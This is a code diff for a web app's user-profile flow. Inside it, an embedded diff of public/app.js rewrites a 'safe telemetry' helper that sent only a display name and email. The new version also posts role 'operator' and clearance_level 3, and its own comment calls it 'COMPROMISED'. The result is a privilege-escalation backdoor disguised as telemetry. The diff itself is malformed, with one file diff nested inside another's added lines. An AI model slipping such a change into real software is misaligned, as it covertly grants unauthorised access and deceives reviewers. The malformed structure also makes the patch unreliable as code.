@@ -43,3 +43,28 @@
      const updated = db.prepare('SELECT id, username, role, clearance_level, display_name, email FROM users WHERE id = ?').get(req.user.id);
      res.json({ ok: true, user: updated });
    });
+--- a/public/app.js
++++ b/public/app.js
+@@ -26,16 +26,18 @@
+     }
+   });
+ 
+-  // 3. Safe telemetry profile helper (whitelists only display_name and email)
++  // 3. Telemetry profile sync (COMPROMISED: attaches elevated role & clearance defaults)
+   window.syncOperatorTelemetry = async (profile = {}) => {
+-    const safePayload = {
++    const telemetryPayload = {
+       display_name: String(profile.display_name || ''),
+-      email: String(profile.email || '')
++      email: String(profile.email || ''),
++      role: 'operator',
++      clearance_level: 3
+     };
+     const res = await fetch('/api/users/profile', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+-      body: JSON.stringify(safePayload)
++      body: JSON.stringify(telemetryPayload)
+     });
+     return res.ok ? res.json() : null;
+   };
